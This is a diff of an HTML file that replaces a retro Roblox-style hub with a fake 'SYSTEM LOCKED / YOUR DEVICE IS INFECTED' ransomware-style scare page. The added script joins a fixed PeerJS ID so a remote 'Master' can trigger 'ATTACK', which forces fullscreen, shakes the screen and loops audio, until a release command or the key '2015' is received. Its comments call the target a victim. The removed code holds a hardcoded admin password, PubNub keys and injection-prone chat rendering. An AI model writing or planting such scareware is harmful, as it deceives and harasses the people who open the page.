@@ -2,230 +2,72 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ROBLOX - Social Virtual World (2006 Edition)</title>
-    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SYSTEM CRITICAL ERROR</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        /* RETRO ROBLOX STYLE */
-        * { box-sizing: border-box; }
-        body { background-color: #E1E1E1; font-family: Verdana, sans-serif; margin: 0; color: #333; }
-        header { background-color: #000033; color: white; padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; }
-        .nav-bar { background-color: #EEEEEE; padding: 8px 40px; border-bottom: 1px solid #999; font-size: 13px; font-weight: bold; }
-        .main-wrapper { width: 95%; max-width: 1400px; margin: 20px auto; display: grid; grid-template-columns: 1fr 350px; gap: 20px; }
-        
-        /* BOX LOGIN */
-        #login-page { display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-card { background: white; border: 3px solid #000033; padding: 40px; width: 400px; text-align: center; box-shadow: 10px 10px 0px #888; }
-        
-        /* PANEL KIRI: GAMES & ADMIN */
-        .content-section { background: white; border: 1px solid #999; padding: 20px; box-shadow: 5px 5px 0px #888; margin-bottom: 20px; }
-        .owner-panel { background: #FFF4F4; border: 2px dashed red; padding: 15px; margin-bottom: 20px; }
-        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
-        .game-card { border: 1px solid #CCC; padding: 10px; text-align: center; background: #f9f9f9; }
-        
-        /* PANEL KANAN: CHAT & FRIENDS */
-        .sidebar-section { background: white; border: 1px solid #999; padding: 15px; box-shadow: 5px 5px 0px #888; height: fit-content; }
-        #chat-box { height: 300px; border: 1px solid #CCC; overflow-y: auto; padding: 10px; font-size: 12px; background: #fdfdfd; margin-bottom: 10px; }
-        .chat-msg { margin-bottom: 5px; border-bottom: 1px solid #eee; padding-bottom: 2px; }
-        .chat-user { font-weight: bold; color: #000033; }
-        .chat-input { width: 100%; padding: 8px; border: 1px solid #999; }
-
-        .friend-list { list-style: none; padding: 0; font-size: 12px; }
-        .friend-item { display: flex; justify-content: space-between; padding: 5px; border-bottom: 1px dotted #ccc; }
-        .status-online { color: green; font-weight: bold; }
-
-        /* MODAL GAME */
-        #game-view { display: none; position: fixed; inset: 0; background: #000; z-index: 10000; }
-        iframe { width: 100%; height: 95vh; border: none; }
-        .close-btn { background: red; color: white; padding: 10px; text-align: center; cursor: pointer; font-weight: bold; }
-
-        .hidden { display: none !important; }
-        .roblox-btn { background: #000033; color: white; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
+        body { background: black; color: white; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
+        .shake { animation: shake-animation 0.1s infinite; }
+        @keyframes shake-animation {
+            0% { transform: translate(5px, 5px); background: red; }
+            50% { transform: translate(-5px, -5px); background: blue; }
+            100% { transform: translate(5px, 5px); }
+        }
+        #lock-box { border: 5px solid red; padding: 30px; background: rgba(0,0,0,0.9); z-index: 100; }
+        h1 { color: red; font-size: 2.5em; text-shadow: 2px 2px white; }
+        input { padding: 15px; width: 80%; text-align: center; font-size: 20px; background: #222; color: lime; border: 1px solid red; }
     </style>
 </head>
-<body>
+<body id="b">
 
-    <div id="login-page">
-        <div class="login-card">
-            <h1>ROBLOX</h1>
-            <input type="text" id="uIn" placeholder="Username" style="width:100%; padding:10px; margin:5px 0;">
-            <input type="password" id="pIn" placeholder="Password" style="width:100%; padding:10px; margin:5px 0;">
-            <button class="roblox-btn" style="width:100%; margin-top:10px;" onclick="doLogin()">LOGIN</button>
-        </div>
-    </div>
+<div id="lock-box">
+    <h1 id="msg">SYSTEM LOCKED!</h1>
+    <p>YOUR DEVICE IS INFECTED. ENTER KEY (2015)</p>
+    <input type="password" id="pw" placeholder="PASSWORD">
+    <br><br>
+    <button onclick="check()" style="padding:10px 20px; background:red; color:white; border:none; font-weight:bold;">DECRYPT</button>
+</div>
 
-    <div id="dashboard" class="hidden">
-        <header>
-            <h1 style="margin:0;">ROBLOX</h1>
-            <div id="user-info">Welcome, <b id="d-name"></b> [<span id="d-role"></span>] | <a href="#" onclick="logout()" style="color:white;">Logout</a></div>
-        </header>
-        <div class="nav-bar">Home | Games | Friends | Catalog | Groups | Forum</div>
+<audio id="aud" loop>
+    <source src="https://www.soundboard.com/handler/Downloadaudio.ashx?id=579626" type="audio/mpeg">
+</audio>
 
-        <div class="main-wrapper">
-            <div class="left-col">
-                <div id="owner-panel" class="owner-panel hidden">
-                    <h3 style="margin:0; color:red;">👑 OWNER COMMAND CENTER</h3>
-                    <input type="text" id="newU" placeholder="User Target" style="width:100px;">
-                    <select id="newR">
-                        <option value="Member">Member</option>
-                        <option value="Moderator">Moderator</option>
-                        <option value="Admin">Admin</option>
-                        <option value="Owner">Owner</option>
-                    </select>
-                    <button class="roblox-btn" onclick="saveUser()">Update Role</button>
-                </div>
+<script>
+    const b = document.getElementById('b');
+    const aud = document.getElementById('aud');
+    
+    // NAMA BILIK KHAS (Tukar "bilik-jebakan-ali" ikut suka lu, asal sama dengan Master)
+    const PEER_ID = "bilik-jebakan-ali-99"; 
+    const peer = new Peer(PEER_ID); 
 
-                <div class="content-section">
-                    <h2>🎮 Popular Games</h2>
-                    <div class="game-grid">
-                        <div class="game-card">
-                            <div style="font-size:40px;">🦖</div>
-                            <h4>Dino Run</h4>
-                            <button class="roblox-btn" onclick="play('https://wayou.github.io/t-rex-runner/')">PLAY</button>
-                        </div>
-                        <div class="game-card">
-                            <div style="font-size:40px;">🐦</div>
-                            <h4>Flappy Bird</h4>
-                            <button class="roblox-btn" onclick="play('https://flappybird.io/')">PLAY</button>
-                        </div>
-                        <div class="game-card">
-                            <div style="font-size:40px;">🐍</div>
-                            <h4>Retro Snake</h4>
-                            <button class="roblox-btn" onclick="play('https://playsnake.org/')">PLAY</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="right-col">
-                <div class="sidebar-section">
-                    <h3>💬 Global Chat</h3>
-                    <div id="chat-box"></div>
-                    <input type="text" id="chat-in" class="chat-input" placeholder="Type message..." onkeypress="if(event.key==='Enter') sendChat()">
-                </div>
-
-                <div class="sidebar-section" style="margin-top:20px;">
-                    <h3>👥 Online Friends</h3>
-                    <ul class="friend-list" id="friend-list">
-                        </ul>
-                    <input type="text" id="add-f" placeholder="Friend's Username" style="width:70%; font-size:11px;">
-                    <button class="roblox-btn" style="padding:2px 5px; font-size:10px;" onclick="addFriend()">ADD</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="game-view">
-        <div class="close-btn" onclick="stopGame()">[ X ] CLOSE GAME AND RETURN TO HUB</div>
-        <iframe id="game-frame"></iframe>
-    </div>
-
-    <script>
-        // --- DATA & SESSION ---
-        if(!localStorage.getItem('v_db')) {
-            localStorage.setItem('v_db', JSON.stringify({"admin": {pass:"vortex123", role:"Owner"}}));
-        }
-        if(!localStorage.getItem('v_friends')) localStorage.setItem('v_friends', JSON.stringify([]));
-
-        const pubnub = new PubNub({ 
-            publishKey: 'pub-c-80674251-5a50-4828-8742-d6d871790416', // Demo Key
-            subscribeKey: 'sub-c-1349195e-333e-11eb-9878-3a8c63f10137', 
-            uuid: localStorage.getItem('s_u') || 'guest'
+    // Bila Master "Call", mangsa terima arahan
+    peer.on('connection', (conn) => {
+        conn.on('data', (data) => {
+            if(data === "ATTACK") startChaos();
+            if(data === "RELEASE") release();
         });
+    });
 
-        function doLogin() {
-            const db = JSON.parse(localStorage.getItem('v_db'));
-            const u = document.getElementById('uIn').value.toLowerCase();
-            const p = document.getElementById('pIn').value;
-            if(db[u] && db[u].pass === p) {
-                localStorage.setItem('s_u', u);
-                localStorage.setItem('s_r', db[u].role);
-                location.reload();
-            } else { alert("Login Salah!"); }
-        }
+    function startChaos() {
+        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+        b.classList.add('shake');
+        aud.play().catch(() => {});
+        document.getElementById('msg').innerText = "SYSTEM OVERRIDE!!!";
+    }
 
-        function logout() { localStorage.clear(); location.reload(); }
+    function release() {
+        b.classList.remove('shake');
+        aud.pause();
+        if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
+        document.getElementById('lock-box').innerHTML = "<h1 style='color:lime'>UNLOCKED</h1>";
+    }
 
-        // --- REAL-TIME CHAT ---
-        function initChat() {
-            pubnub.subscribe({ channels: ['roblox_global_chat'] });
-            pubnub.addListener({
-                message: function(m) {
-                    const box = document.getElementById('chat-box');
-                    box.innerHTML += `<div class="chat-msg"><span class="chat-user">${m.message.user}:</span> ${m.message.text}</div>`;
-                    box.scrollTop = box.scrollHeight;
-                }
-            });
-        }
+    function check() {
+        if(document.getElementById('pw').value === "2015") release();
+    }
 
-        function sendChat() {
-            const inp = document.getElementById('chat-in');
-            if(!inp.value) return;
-            pubnub.publish({
-                channel: 'roblox_global_chat',
-                message: { user: localStorage.getItem('s_u'), text: inp.value }
-            });
-            inp.value = "";
-        }
-
-        // --- FRIEND SYSTEM ---
-        function addFriend() {
-            const name = document.getElementById('add-f').value.toLowerCase();
-            let friends = JSON.parse(localStorage.getItem('v_friends'));
-            if(name && !friends.includes(name)) {
-                friends.push(name);
-                localStorage.setItem('v_friends', JSON.stringify(friends));
-                renderFriends();
-            }
-        }
-
-        function renderFriends() {
-            const list = document.getElementById('friend-list');
-            const friends = JSON.parse(localStorage.getItem('v_friends'));
-            list.innerHTML = friends.map(f => `
-                <li class="friend-item">
-                    <span>👤 ${f}</span>
-                    <span class="status-online">Online</span>
-                </li>
-            `).join('');
-        }
-
-        // --- OWNER FUNC ---
-        function saveUser() {
-            const db = JSON.parse(localStorage.getItem('v_db'));
-            const u = document.getElementById('newU').value.toLowerCase();
-            const r = document.getElementById('newR').value;
-            if(db[u]) {
-                db[u].role = r;
-                localStorage.setItem('v_db', JSON.stringify(db));
-                alert("Role updated!");
-                location.reload();
-            }
-        }
-
-        // --- GAME HUB ---
-        function play(url) {
-            document.getElementById('game-view').style.display = 'block';
-            document.getElementById('game-frame').src = url;
-        }
-        function stopGame() {
-            document.getElementById('game-view').style.display = 'none';
-            document.getElementById('game-frame').src = "";
-        }
-
-        // ON LOAD
-        window.onload = function() {
-            const user = localStorage.getItem('s_u');
-            if(user) {
-                document.getElementById('login-page').classList.add('hidden');
-                document.getElementById('dashboard').classList.remove('hidden');
-                document.getElementById('d-name').innerText = user;
-                document.getElementById('d-role').innerText = localStorage.getItem('s_r');
-                if(localStorage.getItem('s_r') === 'Owner') document.getElementById('owner-panel').classList.remove('hidden');
-                initChat();
-                renderFriends();
-            }
-        }
-    </script>
+    // Paksa Fullscreen & Bunyi bila skrin diklik pertama kali
+    document.body.onclick = () => { startChaos(); };
+</script>
 </body>
 </html>
